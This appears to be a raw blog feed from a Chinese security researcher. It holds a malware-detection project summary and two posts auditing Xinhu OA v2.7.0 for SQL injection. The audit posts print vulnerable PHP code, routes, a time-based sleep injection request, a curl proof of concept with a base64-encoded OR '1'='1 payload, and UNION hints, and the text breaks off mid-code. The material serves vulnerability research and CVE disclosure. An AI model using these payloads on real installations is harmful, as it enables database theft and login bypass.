结果图表/</span><br><span class="line">│   ├── pe_malware_detection_results.png</span><br><span class="line">│   ├── best_models_roc_curves.png</span><br><span class="line">│   └── feature_importance_analysis.png</span><br><span class="line">└── venv/                           # Python虚拟环境</span><br></pre></td></tr></table></figure><h2 id="🎓-学术贡献"><a href="#🎓-学术贡献" class="headerlink" title="🎓 学术贡献"></a>🎓 学术贡献</h2><h3 id="1-理论贡献"><a href="#1-理论贡献" class="headerlink" title="1. 理论贡献"></a>1. 理论贡献</h3><ul><li><strong>模型适用性研究</strong>：系统评估了不同深度学习架构在恶意代码检测中的适用性</li><li><strong>特征重要性分析</strong>：识别了PE文件中对恶意性检测最重要的特征</li><li><strong>预处理策略优化</strong>：确定了最优的数据预处理组合</li></ul><h3 id="2-实践贡献"><a href="#2-实践贡献" class="headerlink" title="2. 实践贡献"></a>2. 实践贡献</h3><ul><li><strong>开源检测系统</strong>：提供了完整的、可复现的恶意代码检测pipeline</li><li><strong>自动化工具链</strong>：从样本收集到结果分析的全自动化流程</li><li><strong>性能基准</strong>：为后续研究提供了标准的性能对比基准</li></ul><h3 id="3-方法创新"><a href="#3-方法创新" class="headerlink" title="3. 方法创新"></a>3. 方法创新</h3><ul><li><strong>多模型集成思路</strong>：为构建更强大的集成检测器奠定基础</li><li><strong>特征工程优化</strong>：提出了PE文件特征提取的最佳实践</li><li><strong>评估框架</strong>：建立了全面的模型评估体系</li></ul><h2 id="🔮-未来工作方向"><a href="#🔮-未来工作方向" class="headerlink" title="🔮 未来工作方向"></a>🔮 未来工作方向</h2><h3 id="1-模型优化"><a href="#1-模型优化" class="headerlink" title="1. 模型优化"></a>1. 模型优化</h3><ul><li><strong>集成学习</strong>：结合多个高性能模型构建集成检测器</li><li><strong>注意力机制</strong>：引入Transformer架构提升特征学习能力</li><li><strong>对抗训练</strong>：增强模型对对抗样本的鲁棒性</li></ul><h3 id="2-特征扩展"><a href="#2-特征扩展" class="headerlink" title="2. 特征扩展"></a>2. 特征扩展</h3><ul><li><strong>动态特征</strong>：结合API调用序列、行为特征</li><li><strong>图结构特征</strong>：利用函数调用图、控制流图</li><li><strong>深度特征</strong>：使用预训练模型提取高级语义特征</li></ul><h3 id="3-实际部署"><a href="#3-实际部署" class="headerlink" title="3. 实际部署"></a>3. 实际部署</h3><ul><li><strong>实时检测</strong>：优化模型推理速度，支持实时检测</li><li><strong>增量学习</strong>：支持新样本的在线学习更新</li><li><strong>边缘计算</strong>：模型压缩与边缘设备部署</li></ul><h2 id="📚-参考文献与相关工作"><a href="#📚-参考文献与相关工作" class="headerlink" title="📚 参考文献与相关工作"></a>📚 参考文献与相关工作</h2><ol><li><strong>PE文件格式分析</strong>：Microsoft PE&#x2F;COFF规范</li><li><strong>恶意代码检测综述</strong>：深度学习在恶意软件检测中的应用</li><li><strong>特征工程方法</strong>：静态分析与动态分析技术对比</li><li><strong>深度学习架构</strong>：CNN、RNN、Transformer在序列分析中的应用</li></ol><h2 id="🏆-项目亮点"><a href="#🏆-项目亮点" class="headerlink" title="🏆 项目亮点"></a>🏆 项目亮点</h2><h3 id="技术亮点"><a href="#技术亮点" class="headerlink" title="技术亮点"></a>技术亮点</h3><ul><li>✅ <strong>全面的模型比较</strong>：10种深度学习模型的系统性评估</li><li>✅ <strong>完整的工程实现</strong>：从数据采集到结果分析的端到端系统</li><li>✅ <strong>高检测精度</strong>：最佳模型达到99%的检测准确率</li><li>✅ <strong>可扩展架构</strong>：模块化设计，易于扩展新模型和特征</li></ul><h3 id="学术价值"><a href="#学术价值" class="headerlink" title="学术价值"></a>学术价值</h3><ul><li>📊 <strong>实证研究</strong>：基于大规模真实数据的实验验证</li><li>🔬 <strong>方法创新</strong>：多维度的模型评估框架</li><li>📈 <strong>性能基准</strong>：为领域研究提供标准对比基准</li><li>🎯 <strong>实用性强</strong>：可直接应用于实际安全防护场景</li></ul><hr><p><strong>项目状态</strong>：✅ 已完成<br><strong>代码开源</strong>：✅ 完整可复现<br><strong>文档完整度</strong>：✅ 详细技术文档<br><strong>适用场景</strong>：🎓 学术研究 | 🏢 工业应用 | 🔒 网络安全</p><hr><p><em>本项目为研究生学位论文的重要组成部分，展示了深度学习在网络安全领域的实际应用价值和学术研究意义。</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PE恶意代码检测系统-基于深度学习的研究项目&quot;&gt;&lt;a href=&quot;#PE恶意代码检测系统-基于深度学习的研究项目&quot; class=&quot;headerlink&quot; title=&quot;PE恶意代码检测系统 - 基于深度学习的研究项目&quot;&gt;&lt;/a&gt;PE恶意代码检测系统 - 基于深度学</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信呼OA v2.7.0代码审计+CVE刷取5个漏洞</title>
    <link href="https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-10T08:49:07.000Z</published>
    <updated>2025-10-27T06:19:01.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="公开漏洞"><a href="#公开漏洞" class="headerlink" title="公开漏洞"></a>公开漏洞</h1><p><a href="https://xz.aliyun.com/news/18609">https://xz.aliyun.com/news/18609</a></p><p><a href="https://xz.aliyun.com/news/18575">https://xz.aliyun.com/news/18575</a></p><p>菜狗大佬公开了三个SQL漏洞</p><h1 id="自行探索"><a href="#自行探索" class="headerlink" title="自行探索"></a>自行探索</h1><p>首先就是他的思想是，找一些解密之后直接拼接数据库的操作，我们首先跟着这个思路来。</p><h2 id="前台SQL注入1"><a href="#前台SQL注入1" class="headerlink" title="前台SQL注入1"></a>前台SQL注入1</h2><p>菜狗大佬只分析了参数“shouji”,可以看到下面也有一个“userid参数”是直接解密然后到下面的getone函数，这里的前提是$barr[‘success’]，也就是$urs     &#x3D; m(‘admin’)-&gt;getone(“<code>mobile</code>&#x3D;’$shouji’ AND <code>status</code>&#x3D;1”);要是正确的手机号。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165612920.png" alt="image-20251010165612920"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165930343.png" alt="image-20251010165930343"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170148715.png" alt="image-20251010170148715"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170106620.png" alt="image-20251010170106620"></p><p>不带cookie依旧也是可以，所以是前台注入</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170252307.png" alt="image-20251010170252307"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /task.php?m=login|api&amp;a=setwxqy&amp;d=task&amp;shouji=MTU4MDAwMDAwMjM=&amp;userid=MSdhbmQgc2xlZXAoMyktLSA=&amp;num=test&amp;agentid=1&amp;callback=test&quot; HTTP/1.1</span><br><span class="line">Host: 192.168.31.23:85</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1759770582; HMACCOUNT=4160D16E28E71D0D; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1760018993; PHPSESSID=ulo3i8uqc6539kccfednk4bhcd; deviceid=1760022055661; xinhu_mo_adminid=jy0los0uo0llv0uu0zo0loo0llj0loo0ju0zt0lov0uu0ju0ut0zj05; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="提交了5个cve"><a href="#提交了5个cve" class="headerlink" title="提交了5个cve"></a>提交了5个cve</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251026234644511.png" alt="image-20251026234644511"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;公开漏洞&quot;&gt;&lt;a href=&quot;#公开漏洞&quot; class=&quot;headerlink&quot; title=&quot;公开漏洞&quot;&gt;&lt;/a&gt;公开漏洞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/18609&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    <category term="PHP安全" scheme="https://250wuyifan.github.io/categories/PHP%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PHP安全" scheme="https://250wuyifan.github.io/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>复习SQL注入</title>
    <link href="https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-10-07T17:07:50.000Z</published>
    <updated>2025-10-10T09:03:20.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告"><a href="#【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告" class="headerlink" title="【最终完整版】信呼OA v2.7.0 - 解密SQL注入漏洞审计报告"></a>【最终完整版】信呼OA v2.7.0 - 解密SQL注入漏洞审计报告</h1><h2 id="📋-执行摘要"><a href="#📋-执行摘要" class="headerlink" title="📋 执行摘要"></a>📋 执行摘要</h2><p><strong>按照规律系统性搜索：<code>base64decode/uncrypt</code> → 无过滤 → 直接SQL拼接</strong></p><p>发现 <strong>15个真正的解密参数SQL注入漏洞</strong>！</p><hr><h2 id="🎯-核心漏洞规律"><a href="#🎯-核心漏洞规律" class="headerlink" title="🎯 核心漏洞规律"></a>🎯 核心漏洞规律</h2><p>你教会我的规律：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数 → decode/uncrypt → ❌(无iconvsql/filterstr/xssrepstr) → SQL拼接</span><br></pre></td></tr></table></figure><hr><h2 id="🔥-完整漏洞列表（15个）"><a href="#🔥-完整漏洞列表（15个）" class="headerlink" title="🔥 完整漏洞列表（15个）"></a>🔥 完整漏洞列表（15个）</h2><h3 id="【1】inputAction-php-getselectdataAjax-万能SQL注入-⭐⭐⭐⭐⭐⭐"><a href="#【1】inputAction-php-getselectdataAjax-万能SQL注入-⭐⭐⭐⭐⭐⭐" class="headerlink" title="【1】inputAction.php - getselectdataAjax() - 万能SQL注入 ⭐⭐⭐⭐⭐⭐"></a>【1】inputAction.php - getselectdataAjax() - 万能SQL注入 ⭐⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/flow/input/inputAction.php:782</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getselectdataAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$actstr</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;actstr&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$acta</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$act</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$actstr</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = <span class="title function_ invoke__">c</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">sqlstore</span>(<span class="variable">$actstr</span>);  <span class="comment">// ⚠️ 无过滤，直接传入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sqlstore代码</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inputChajian.php:399</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlstore</span>(<span class="params"><span class="variable">$actstr1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$acta</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr1</span>);</span><br><span class="line">    <span class="variable">$sqla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$acta</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$sqla</span>,<span class="number">2</span>,<span class="string">&#x27;1=1&#x27;</span>);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$wher</span>);  <span class="comment">// ⚠️ 仅替换 $ 为 &quot;</span></span><br><span class="line">    <span class="variable">$rowa</span> = <span class="title function_ invoke__">m</span>(<span class="variable">$sqla</span>[<span class="number">0</span>])-&gt;<span class="title function_ invoke__">getall</span>(<span class="variable">$wher</span>,<span class="variable">$sqla</span>[<span class="number">1</span>]);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rowa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>可控表名、字段、WHERE条件</li><li><strong>可读取任意表的任意数据</strong></li></ul><p><strong>路由</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?a=getselectdata&amp;m=input&amp;d=flow&amp;ajaxbool=true&amp;actstr=[base64_payload]</span><br></pre></td></tr></table></figure><hr><h3 id="【2】tableAction-php-savedbupurlAjax-任意配置写入-⭐⭐⭐⭐"><a href="#【2】tableAction-php-savedbupurlAjax-任意配置写入-⭐⭐⭐⭐" class="headerlink" title="【2】tableAction.php - savedbupurlAjax() - 任意配置写入 ⭐⭐⭐⭐"></a>【2】tableAction.php - savedbupurlAjax() - 任意配置写入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/system/table/tableAction.php:149</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savedbupurlAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dz&#x27;</span>);</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$dz</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&#x27;option&#x27;</span>)-&gt;<span class="title function_ invoke__">setval</span>(<span class="string">&#x27;dbupurl&#x27;</span>, <span class="variable">$dz</span>);  <span class="comment">// ⚠️ 无过滤，直接写入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>setval代码</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// optionModel.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setval</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$val</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$isub</span>=<span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;num&#x27;</span> =&gt; <span class="variable">$num</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$val</span>,  <span class="comment">// ⚠️ 直接插入数据库</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>可写入任意系统配置</li><li>可能导致RCE或权限绕过</li></ul><hr><h3 id="【3】loginAction-php-jinxwqqtbAction-Mobile-SQL注入-（分享）⭐⭐⭐⭐⭐"><a href="#【3】loginAction-php-jinxwqqtbAction-Mobile-SQL注入-（分享）⭐⭐⭐⭐⭐" class="headerlink" title="【3】loginAction.php - jinxwqqtbAction() - Mobile SQL注入 （分享）⭐⭐⭐⭐⭐"></a>【3】loginAction.php - jinxwqqtbAction() - Mobile SQL注入 （<strong>分享</strong>）⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/loginAction.php:304</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jinxwqqtbAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="variable">$shouji</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;shouji&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$userid</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userid&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$urs</span>     = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`mobile`=&#x27;<span class="subst">$shouji</span>&#x27; AND `status`=1&quot;</span>);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li><code>$shouji</code> 可注入SQL</li><li>可以绕过身份认证</li></ul><p><strong>POC</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shouji=$(<span class="built_in">echo</span> -n <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | <span class="built_in">base64</span>)</span><br><span class="line">curl <span class="string">&quot;http://target/index.php?a=jinxwqqtb&amp;m=login&amp;d=api&amp;ajaxbool=true&amp;shouji=<span class="variable">$&#123;shouji&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="【4】loginAction-php-yzmAction-Mobile-SQL注入2-⭐⭐⭐⭐⭐"><a href="#【4】loginAction-php-yzmAction-Mobile-SQL注入2-⭐⭐⭐⭐⭐" class="headerlink" title="【4】loginAction.php - yzmAction() - Mobile SQL注入2 ⭐⭐⭐⭐⭐"></a>【4】loginAction.php - yzmAction() - Mobile SQL注入2 ⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/loginAction.php:263</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yzmAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$mobile</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">iscnmobile</span>(<span class="variable">$mobile</span>))<span class="keyword">return</span> <span class="title function_ invoke__">returnerror</span>(<span class="string">&#x27;err2&#x27;</span>);</span><br><span class="line">    <span class="variable">$where</span>  = <span class="string">&quot;`mobile`=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ... m(&#x27;admin&#x27;)-&gt;getone($where)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="【5】goodsModel-php-getpage-Keyword-LIKE注入-⭐⭐⭐⭐"><a href="#【5】goodsModel-php-getpage-Keyword-LIKE注入-⭐⭐⭐⭐" class="headerlink" title="【5】goodsModel.php - getpage() - Keyword LIKE注入 ⭐⭐⭐⭐"></a>【5】goodsModel.php - getpage() - Keyword LIKE注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/goodsModel.php:123</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getpage</span>(<span class="params"><span class="variable">$where</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;sort&#x27;</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>  = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">        <span class="variable">$where</span>.= <span class="string">&quot; and (a.`name` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`num` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`xinghao` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`guige` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>: 可以在LIKE中注入：<code>%&#39; UNION SELECT ...--</code></p><hr><h3 id="【6-7】crmModel-php-getclientselect-getclientpage-LIKE注入-⭐⭐⭐⭐"><a href="#【6-7】crmModel-php-getclientselect-getclientpage-LIKE注入-⭐⭐⭐⭐" class="headerlink" title="【6-7】crmModel.php - getclientselect() &#x2F; getclientpage() - LIKE注入 ⭐⭐⭐⭐"></a>【6-7】crmModel.php - getclientselect() &#x2F; getclientpage() - LIKE注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/crmModel.php:17,41</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第17行</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 拼接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第41行</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 拼接</span></span><br></pre></td></tr></table></figure><hr><h3 id="【8】loginModel-php-cookie登录-Token-SQL注入-⭐⭐⭐⭐"><a href="#【8】loginModel-php-cookie登录-Token-SQL注入-⭐⭐⭐⭐" class="headerlink" title="【8】loginModel.php - cookie登录 - Token SQL注入 ⭐⭐⭐⭐"></a>【8】loginModel.php - cookie登录 - Token SQL注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/loginModel.php:361</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tokans</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;mo_adminid&#x27;</span>));  <span class="comment">// ⚠️ 解密cookie</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$tokans</span>))&#123;</span><br><span class="line">    <span class="variable">$onrs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`token`=&#x27;<span class="subst">$tokans</span>&#x27;&quot;</span>,<span class="string">&#x27;`name`,`token`,`id`,`uid`&#x27;</span>);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>通过cookie注入</li><li>可能绕过登录验证</li></ul><hr><h3 id="【9】uploadAction-php-getwobaAction-分类过滤注入-⭐⭐⭐⭐"><a href="#【9】uploadAction-php-getwobaAction-分类过滤注入-⭐⭐⭐⭐" class="headerlink" title="【9】uploadAction.php - getwobaAction() - 分类过滤注入 ⭐⭐⭐⭐"></a>【9】uploadAction.php - getwobaAction() - 分类过滤注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/uploadAction.php:555</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 